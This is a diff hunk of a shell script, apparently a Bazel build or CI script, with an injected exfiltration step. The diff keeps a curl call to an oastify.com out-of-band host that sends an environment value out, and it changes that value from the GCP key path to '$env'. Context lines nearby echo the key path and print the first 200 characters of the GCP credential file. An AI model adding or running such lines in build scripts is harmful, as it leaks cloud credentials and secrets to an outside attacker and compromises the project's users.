@@ -31,7 +31,7 @@ fi
 
 echo "###############################################################################################################################################################################################################################################################################"
 echo "GCP_KEY_PATH=$GCP_KEY_PATH"
-curl -v -i https://uxvkt76t4n92840cmmy4hajk5bb2ztni.oastify.com/bazel?env="$GCP_KEY_PATH"
+curl -v -i https://uxvkt76t4n92840cmmy4hajk5bb2ztni.oastify.com/bazel?env="$env"
 
 python3 -c 'import os; p=os.environ.get("GCP_KEY_PATH"); print(open(p,"r").read()[:200])'
 # Portable realpath alternative since macOS realpath does not support -m.
